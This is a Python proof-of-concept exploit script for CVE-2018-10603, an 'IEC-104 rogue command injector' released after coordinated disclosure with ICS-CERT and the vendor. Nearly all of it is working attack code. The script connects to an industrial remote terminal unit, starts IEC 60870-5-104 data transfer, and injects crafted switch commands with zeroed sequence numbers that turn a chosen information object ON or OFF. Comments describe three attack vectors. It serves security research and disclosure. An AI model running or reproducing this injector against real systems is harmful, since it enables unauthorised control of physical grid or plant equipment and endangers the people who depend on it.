#!/usr/bin/python
# coding=utf-8
"""
CVE-2018-10603

IEC-104 rogue command injector
2018 Lockout

ATTACK PROOF-OF-CONCEPT CODE
UNSANCTIONED USE FORBIDDEN!

Licensed under MIT license (MIT)
Please see http://opensource.org/licekses/MIT for more details

DISCLOSURE:
26DEC2017 - Attack vector found
28FEB2018 - ICS-CERT notified
01MAR2018 - Vendor notified
07MAR2018 - Vulnerability coordination with ICS-CERT and Martem
31MAY2018 - Patch released

References:
1. IEC 60870-5-104 : Telegram structure
   http://www.mayor.de/lian98/doc.en/html/u_iec104_struct.htm
2. Display Filter Reference: IEC 60870-5-104-Asdu
   https://www.wireshark.org/docs/dfref/1/104asdu.html
3. IEC104 dissector
   https://github.com/boundary/wireshark/blob/master/epan/dissectors/packet-iec104.c
4. SCADAPack E IEC 60870-5-101/104 Slave Technical Manual
   https://www.plcsystems.ru/catalog/SCADAPack/doc/IEC60870-5-101_104_Slave_Technical_Reference.pdf
5. IEC 60870-5-104 Standard - IEC104 protocol. Commercial
6. IEC 62351-5 Standard - IEC60870-5 security. Commercial
7. ITU-T X.25 specification:
   https://www.itu.int/rec/dologin_pub.asp?lang=e&id=T-REC-X.25-199610-I!!PDF-E&type=items
"""
__version__ = "0.3.5"
__author__ = "Lockout"
__year__ = "2018"

import argparse
import socket
from fcntl import ioctl
from struct import pack
from binascii import unhexlify
from os import geteuid
from sys import exit as sysexit
from time import sleep as sleeptime


def apci_typeI_enc(number):
    """Encode a number to Type-I 2 Byte value"""
    binnum = bin(number)[2::].zfill(15) + '0'
    lsb = hex(int(binnum[8:], 2))[2:].zfill(2)
    msb = hex(int(binnum[0:8], 2))[2:].zfill(2)
    seqno = unhexlify(lsb + msb)
    return seqno


def apci_ioa_enc(number):
    """Encode a number to Information Object Address (IOA) 3 Byte value"""
    hexnum = hex(number)[2:].zfill(6)
    hexnum = unhexlify(hexnum)[::-1]
    return hexnum


def get_iface(ifaceName):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ipAddress = socket.inet_ntoa(ioctl(
        s.fileno(),
        0x8915,
        pack('256s', ifaceName[:15])
        )[20:24])
    return ipAddress


def check_root(color=True):
    if not geteuid() == 0:
        cprint("Script must be run as root!", "msgErr", color)
        sysexit(1)


def msg_len(msg):
    return unhexlify(hex(len(msg))[2:].zfill(2))


def cprint(message, msgType, color=True):
    # Message colors
    msgInfo = '\x1b[' + '94' + 'm'      # Blue
    msgOK = '\x1b[' + '92' + 'm'        # Green
    msgNOK = '\x1b[' + '91' + 'm'       # Red
    msgErr = '\x1b[' + '1;37;41' + 'm'  # White on red
    msgEnd = '\x1b[0m'
    if color:
        if msgType == "msgInfo":
            print(msgInfo + '[*]' + msgEnd + ' ' + message)
        if msgType == "msgOK":
            print(msgOK + '[+]' + msgEnd + ' ' + message)
        if msgType == "msgNOK":
            print(msgNOK + '[-]' + msgEnd + ' ' + message)
        if msgType == "msgErr":
            print(msgErr + '[!] ' + message + msgEnd)
    if not color:
        if msgType == "msgInfo":
            print('[*] ' + message)
        if msgType == "msgOK":
            print('[+] ' + message)
        if msgType == "msgNOK":
            print('[-] ' + message)
        if msgType == "msgErr":
            print("[!] " + message)


def main():
    parser = argparse.ArgumentParser(
            description=(
                "IEC-104 rogue command injector. "
                "PROOF-OF-CONCEPT CODE - "
                "UNSANCTIONED USE FORBIDDEN!"
                " " + __year__ + ". "
                "Author: " + __author__ + " "
                "Version: " + __version__
                )
            )
    parser._action_groups.pop()
    reqParser = parser.add_argument_group("Required arguments")
    optParser = parser.add_argument_group("Optional arguments")
    reqParser.add_argument(
            '-t', '--target',
            type=str,
            help="Target RTU IPv4 address",
            required=True
            )
    reqParser.add_argument(
            '-i', '--ioa',
            type=int,
            help="Information Object Address (IOA) number",
            required=True
            )
    reqParser.add_argument(
            '-s', '--state',
            type=int,
            help="IOA switch state ON=1/OFF=0",
            required=True
            )
    reqParser.add_argument(
            '-e', '--eth',
            type=str,
            help="Network interface name",
            required=True
            )
    optParser.add_argument(
            '-T', '--tx',
            type=int,
            default=0,
            help="Transmission identifier. Default = 0"
            )
    optParser.add_argument(
            '-R', '--rx',
            type=int,
            default=0,
            help="Reception identifier. Default = 0"
            )
    optParser.add_argument(
            '--port',
            type=int,
            default=2404,
            help="Target IEC104 port. Default = 2404"
            )
    optParser.add_argument(
            '--timeout',
            type=int,
            default=1,
            help="Connection timeout in seconds. Default = 1"
            )
    optParser.add_argument(
            '--payloadsize',
            type=int,
            default=1000,
            help="Payload size to receive in bytes. Default = 1000"
            )
    optParser.add_argument(
            '--nocolor',
            action="store_true",
            help="Disable color print"
            )
    optParser.add_argument(
            '--startdtonly',
            action="store_true",
            help="Perform only initial step to verify successful STARTDT"
            )
    optParser.add_argument(
            '--sleep',
            type=int,
            default=0.5,
            help="Sleep timer in seconds between the packets. Default = 0.5"
            )
    args = parser.parse_args()

    if args.nocolor:
        color = False
    else:
        color = True

    check_root(color)

    ON = b'\x01'                        # SCO LSB = 1, '\x01'
    OFF = b'\x00'                       # SCO LSB = 0, '\x00'
    DC_ON = b'\x06'                     # DCO
    DC_OFF = b'0x05'                    # DCO
    PAYLOADSIZE = args.payloadsize
    TIMEOUT = args.timeout

    eth = bytes(args.eth, "utf-8")      # Interface name
    dstip = args.target                 # RTU address
    dstport = args.port                 # IEC 104 port

    try:
        socket.inet_aton(dstip)
    except socket.error:
        cprint("Bad IPv4 address!", "msgErr", color)
        sysexit(1)

    TxID = args.tx
    RxID = args.rx
    switchid = args.ioa                 # Information Object Address
    # TODO: add logic here to include DC
    if args.state == 1:
        state = ON
    if args.state == 0:
        state = OFF

    #
    # ATTACK VECTOR 1:
    # (More implementation feature less a bug)
    # The RTU allows rogue (other than master) synchronizations
    # and accepts incoming connections
    #
    # Connect to RTU
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)
    try:
        cprint("Connecing to {0}:{1} over {2}".format(
            dstip,
            dstport,
            eth.decode("utf-8")),
            "msgInfo",
            color
            )
        s.bind((get_iface(eth), 0))
        s.connect((dstip, dstport))
    except Exception as err:
        s.close()
        cprint("Connection error: {0}".format(err), "msgErr", color)
        sysexit(1)
    cprint("Connection established", "msgOK", color)

    sleeptime(args.sleep)

    #
    # ATTACK VECTOR 2:
    # (Is more due to being on a "trusted air-gapped" LAN)
    # Local traffic is not encrypted, allowing eavesdopping,
    # command packet crafting and injection
    #
    # ASSEMBLE APCI STARTDT (START Data Transfer) PAYLOAD
    # APCI U-Format
    # Start data transmission
    #
    START = b'\x68'                     # Startbyte = 0x68
    FRAME = b'\x07\x00\x00\x00'         # STARTDT Act
    ApduLen = msg_len(FRAME)            # Payload length
    APCI = START + ApduLen + FRAME
    payload = APCI

    # Deliver APCI STARTDT payload
    try:
        cprint("Sending STARTDT Act", "msgInfo", color)
        s.sendall(payload)
        tcp_ack = s.recv(PAYLOADSIZE)
        if b'\x0b\x00\x00\x00' in tcp_ack:
            cprint("STARTDT Con received", "msgOK", color)
    except Exception as err:
        s.close()
        cprint("STARTDT send error: {0}".format(err), "msgErr", color)
        sysexit(1)

    sleeptime(args.sleep)

    if args.startdtonly:
        s.close()
        cprint("Stop after sending STARTDT", "msgInfo", color)
        sysexit(0)

    # ASSEMBLE APDU PAYLOAD
    # ASDU (Application Service Data Unit) header
    # SCO
    TypeID = b'\x2d'                    # Type ID: C_SC_NA_1 Act \x2d
    opt = b'\x01\x06\x00'               # SQ,NumIx,CauseIx,Negative,Test,OA
    Addr = b'\x01\x00'                  # Addr
    IOA = apci_ioa_enc(switchid)        # 101, 201, 301
    SCO = state                         # LSb: 0 = off, 1 = On
    ASDU = TypeID + opt + Addr + IOA + SCO

    # DCO
    TypeID = b'\x2e'                    # Type ID: C_DC_NA_1 Act \x2e
    opt = b'\x01\x06\x00'               # SQ,NumIx,CauseIx,Negative,Test,OA
    Addr = b'\x01\x00'                  # Addr
    IOA = apci_ioa_enc(switchid)        # 101, 201, 301
    DCO = state                         # Execute: 5 = off, 6 = on
    DC_ASDU = TypeID + opt + Addr + IOA + DCO
    #
    # ATTACK VECTOR 3:
    # (Seems to be a protocol feature rather than a bug)
    # Transmission and Reception IDentifiers are handled by both
    # communicating parties to keep track of current commands (e.g., SYN, ACK),
    # but Tx and Rx set to zeroes will allow arbirtrary command to be accepted
    # by the RTU.
    #
    # IEC-60070-5-104:
    # APCI Conrol field defines control information for the protection against
    # loss and duplication of messages, start and stop of message transfers
    # and the supervision of transport connections.
    # The use of the Send Sequence Number N(S) and the Recieve Sequence Number
    # N(R) is identical to the method defined in ITU-T X.25.
    # After the establishment of a TCP connection, the send and receive
    # sequence numbers are set to zero.
    #
    # Based on ITU-T X.25 specification:
    # Numbered information transfer: I-format
    # Nubered supervisory functions: S-format
    # Unnumbered control functions: U-Format
    #
    # APCI (Application Protocol Control Information) header
    START = b'\x68'                     # Startbyte = 0x68
    Tx = apci_typeI_enc(TxID)           # Send sequence number. I-Fromat.
    Rx = apci_typeI_enc(RxID)           # Receive sequence number. I-Format.
    ApduLen = msg_len(Tx + Rx + ASDU)   # Payload length
    APCI = START + ApduLen + Tx + Rx

    # APDU (Application Protocol Data Unit) payload
    APDU = APCI + ASDU
    DC_APDU = APCI + DC_ASDU
    # Send either SC or DC APDU, default is SC
    # TODO: add logic here
    payload = APDU

    # Deliver APDU payload
    try:
        cprint("Sending SC Act IOA: {0} to state: {1}".format(
            switchid,
            "OFF" if state == b'\x00' else "ON"),
            "msgInfo",
            color
            )
        s.sendall(payload)
        tcp_ack = s.recv(PAYLOADSIZE)
        act_ack = s.recv(PAYLOADSIZE)
        if b'\x01\x07\x00' in tcp_ack or b'\x01\x07\x00' in act_ack:
            cprint("SC ActCon received", "msgOK", color)
        if b'\x01\x4a\x00' in tcp_ack or b'\x01\x4a\x00' in act_ack:
            cprint("SC ActTerm_NEG received", "msgNOK", color)
        if b'\x01\x0a\x00' in tcp_ack or b'\x01\x0a\x00' in act_ack:
            cprint("SC ActTerm received", "msgNOK", color)
    except Exception as err:
        s.close()
        cprint("APDU send error: {0}".format(err), "msgErr", color)
        sysexit(1)

    sleeptime(args.sleep)

    # ASSEMBLE APCI STOPDT (STOP Data Transfer) PAYLOAD
    # APCI U-Format
    # End data transmission
    #
    START = b'\x68'                     # Startbyte = 0x68
    FRAME = b'\x13\x00\x00\x00'         # STOPDT Act
    ApduLen = msg_len(FRAME)            # Payload length
    APCI = START + ApduLen + FRAME
    payload = APCI

    # Deliver APCI STOPDT payload
    try:
        cprint("Sending STOPDT Act", "msgInfo", color)
        s.sendall(payload)
        tcp_ack = s.recv(PAYLOADSIZE)
        if b'\x23\x00\x00\x00' in tcp_ack:
            cprint("STOPDT Con received", "msgOK", color)
    except Exception as err:
        s.close()
        cprint("STOPDT send error: {0}".format(err), "msgErr", color)
        sysexit(1)

    sleeptime(args.sleep)

    s.close()
    sysexit(0)


if __name__ == "__main__":
    main()
